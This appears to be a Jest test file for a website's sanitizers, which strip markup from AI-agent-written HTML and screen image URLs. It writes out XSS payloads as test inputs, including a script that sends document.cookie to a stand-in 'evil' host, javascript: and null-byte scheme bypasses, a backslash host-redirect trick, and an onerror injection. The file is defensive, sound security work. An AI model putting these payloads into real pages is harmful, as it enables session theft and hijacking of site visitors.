/**
 * `ContentRenderBody` used to hand `structured.sections[].html` and `body_html`
 * to `dangerouslySetInnerHTML`, and both are written by the COPY agent. It
 * renders in the ADMIN PREVIEW MODAL as well as on the public page, so the
 * payload would have executed in the reviewer's authenticated session.
 *
 * These are the shapes a model — or an injected instruction inside one — would
 * actually produce.
 */

import path from 'path'
import {
  htmlToPlainText,
  containsMarkup,
  safeImageUrl,
  ALLOWED_IMAGE_HOSTS,
} from '@/lib/content/contentSafety'
import { SITE_URL } from '@/lib/seo'

const U = (cp: number) => String.fromCodePoint(cp)

/**
 * `containsMarkup` and the stripper inside `htmlToPlainText` used to carry two
 * different definitions of "a tag": the predicate said `<` + `[a-zA-Z!/?]`, the
 * stripper deleted `<[^>]*>` — anything between angle brackets. So a string the
 * predicate called prose, the stripper mangled. `ContentRenderBody` and
 * `buildJsonLd` call `htmlToPlainText` UNGUARDED on FAQ questions, FAQ answers
 * and section headings, so this ran on every render of every published page.
 */
describe('the two definitions of "markup" agree', () => {
  it.each([
    'Groups of <10 guests and >4 adults',
    '5 < 10 and 20 > 3',
    'Ages 5<8 are welcome',
    'Parties for <12 kids',
  ])('prose the predicate calls safe survives the stripper: %j', s => {
    expect(containsMarkup(s)).toBe(false)
    expect(htmlToPlainText(s)).toBe(s)
  })

  it('anything the stripper removes, the predicate flags', () => {
    for (const s of ['<b>x</b>', '</p>', '<!-- c -->', '<?php ?>', '<img src=x>', '<1 2>', '<10 x>']) {
      const changed = htmlToPlainText(s) !== s
      if (changed) expect(containsMarkup(s)).toBe(true)
    }
  })
})

describe('containsMarkup', () => {
  it.each([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<p>hi</p>',
    '<!-- comment -->',
    '</div>',
  ])('flags %j', s => expect(containsMarkup(s)).toBe(true))

  it.each(['plain text', 'a < b and c > d', '5 < 10', '', null, undefined])(
    'does not flag %j',
    s => expect(containsMarkup(s as string)).toBe(false),
  )
})

describe('htmlToPlainText removes the payload, keeps the prose', () => {
  it('strips a script tag and its BODY, not just the tags', () => {
    const out = htmlToPlainText('<p>Welcome</p><script>fetch("//evil/"+document.cookie)</script>')
    expect(out).toContain('Welcome')
    expect(out).not.toMatch(/fetch|evil|document\.cookie/)
    expect(out).not.toContain('<')
  })

  it('an UNTERMINATED script still loses its body', () => {
    const out = htmlToPlainText('<p>Welcome</p><script>steal()')
    expect(out).toContain('Welcome')
    expect(out).not.toContain('steal')
  })

  it('drops an event-handler attribute along with its tag', () => {
    const out = htmlToPlainText('<img src=x onerror="alert(1)">Southampton')
    expect(out).toBe('Southampton')
  })

  it('keeps paragraph structure as line breaks', () => {
    expect(htmlToPlainText('<p>One</p><p>Two</p>')).toBe('One\nTwo')
    expect(htmlToPlainText('a<br>b')).toBe('a\nb')
  })

  it('decodes entities, then re-strips what decoding revealed', () => {
    // A single-encoded tag must not survive the decode pass as live markup.
    expect(htmlToPlainText('&lt;script&gt;alert(1)&lt;/script&gt;')).toBe('alert(1)')
    expect(htmlToPlainText('Allie &amp; Adam')).toBe('Allie & Adam')
    expect(htmlToPlainText('caf&#233;')).toBe('café')
    expect(htmlToPlainText('caf&#xe9;')).toBe('café')
  })

  it('leaves an unknown or out-of-range entity as written rather than guessing', () => {
    expect(htmlToPlainText('&nosuchentity;')).toBe('&nosuchentity;')
    expect(htmlToPlainText('&#1114112;')).toBe('&#1114112;')
    // A lone surrogate is not a character; do not invent one (rule 15).
    expect(htmlToPlainText('&#xD800;')).toBe('&#xD800;')
  })

  it('collapses a non-breaking space so a padded line is not "content"', () => {
    expect(htmlToPlainText(`a${U(0xa0)}${U(0xa0)}b`)).toBe('a b')
  })

  it.each([null, undefined, ''])('handles %j', v => expect(htmlToPlainText(v as string)).toBe(''))
})

describe('safeImageUrl', () => {
  it.each(['/images/party.jpg', '/images/party.jpg?v=2'])('allows %j', u =>
    expect(safeImageUrl(u)).toBe(u),
  )

  it('allows the Supabase storage bucket the app already renders from', () => {
    const u = 'https://ychnlroczjhwimouecxz.supabase.co/storage/v1/object/public/a.png'
    expect(safeImageUrl(u)).toBe(u)
  })

  it('an absolute URL for our OWN origin comes back site-relative', () => {
    expect(safeImageUrl('https://www.hosthampton.com/images/a.png')).toBe('/images/a.png')
  })

  it.each([
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    '//evil.example.com/a.png',
    'vbscript:x',
    'file:///etc/passwd',
    'images/relative.png',
    '',
    '   ',
  ])('refuses %j', u => expect(safeImageUrl(u)).toBeNull())

  /**
   * THE BYPASS. `startsWith('//')` was the entire protocol-relative guard, and
   * the WHATWG URL spec normalises a backslash to a forward slash in a special
   * scheme — so ONE backslash turned a path the screen read as site-relative
   * into a different origin in every browser. Landed in `<img src>` on the
   * public page and in `og:image`, three lines apart, exactly the two readers
   * link 6's own probe caught for `featured_image`.
   */
  it('refuses a backslash protocol-relative URL, which resolves to another host', () => {
    const payload = '/\\evil.example.com/x.png'
    // The premise, asserted rather than described: this really is another host.
    expect(new URL(payload, 'https://www.hosthampton.com').href).toBe('https://evil.example.com/x.png')
    expect(safeImageUrl(payload)).toBeNull()
    expect(safeImageUrl('/\\/evil.example.com/x.png')).toBeNull()
    expect(safeImageUrl('\\\\evil.example.com/x.png')).toBeNull()
  })

  it('refuses an arbitrary remote host — an <img> leaks every visitor to it', () => {
    expect(safeImageUrl('https://cdn.example.com/a.png')).toBeNull()
    expect(safeImageUrl('HtTpS://EVIL.example.com/a.png')).toBeNull()
    // `og:image` is the sharper half: the card Facebook and iMessage render for
    // a Host Hampton URL would be whatever that host serves, changeable after a
    // human approved the row.
    expect(safeImageUrl('https://evil.example.com/og.png')).toBeNull()
  })

  it('refuses plaintext http even for our own host (mixed content never loads)', () => {
    expect(safeImageUrl('http://www.hosthampton.com/images/a.png')).toBeNull()
  })

  it('PARSES rather than prefix-matches, so trailing junk cannot ride along', () => {
    // The old screen tested only `^https?://[^/\s]+` and returned the string it
    // was handed, tail and all.
    expect(safeImageUrl('https://ychnlroczjhwimouecxz.supabase.co/a.png" onerror="alert(1)')).toBe(
      'https://ychnlroczjhwimouecxz.supabase.co/a.png%22%20onerror=%22alert(1)',
    )
  })

  it('refuses a scheme split by a control character', () => {
    // `java<NUL>script:` is the classic bypass; built by code point so the test
    // file stays readable (plan §24 — an invisible literal is an unreadable
    // guardrail).
    expect(safeImageUrl(`java${U(0x00)}script:alert(1)`)).toBeNull()
    expect(safeImageUrl(`java${U(0x09)}script:alert(1)`)).toBeNull()
    expect(safeImageUrl(`java${U(0x0a)}script:alert(1)`)).toBeNull()
  })

  it('refuses U+2028 / U+2029 INSIDE the URL — the pair that already cost a guardrail', () => {
    expect(safeImageUrl(`/a${U(0x2028)}b.png`)).toBeNull()
    expect(safeImageUrl(`/a${U(0x2029)}b.png`)).toBeNull()
    expect(safeImageUrl(`https://cdn.example.com/${U(0x2028)}x.png`)).toBeNull()
  })

  it('a TRAILING U+2028 is removed by trim(), not by the screen', () => {
    // Worth pinning: `String.prototype.trim` counts U+2028/U+2029 as
    // whitespace, so a trailing one never reaches the code-point loop. The URL
    // that comes back is the trimmed one — safe, but for a different reason
    // than the test above, and a future refactor that drops the trim would
    // change which check is load-bearing.
    expect(safeImageUrl(`/a.png${U(0x2028)}`)).toBe('/a.png')
  })

  it.each([null, undefined])('handles %j', v => expect(safeImageUrl(v as string)).toBeNull())
})

/**
 * Rule 11: the app declares its remote image hosts in `next.config.js`
 * (`images.domains`). If a host is added there and not here, every DB image
 * from it is silently refused; if it is added here and not there, `next/image`
 * refuses it instead. Read the config off disk rather than restating it.
 */
describe('ALLOWED_IMAGE_HOSTS does not drift from next.config.js', () => {
  it('covers every host in images.domains', () => {
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const config = require(path.join(process.cwd(), 'next.config.js')) as {
      images?: { domains?: string[] }
    }
    const declared = config.images?.domains ?? []
    expect(declared.length).toBeGreaterThan(0)
    for (const host of declared) {
      expect(ALLOWED_IMAGE_HOSTS).toContain(host.toLowerCase())
    }
  })

  it('includes the site origin itself', () => {
    expect(ALLOWED_IMAGE_HOSTS).toContain(new URL(SITE_URL).host)
  })
})
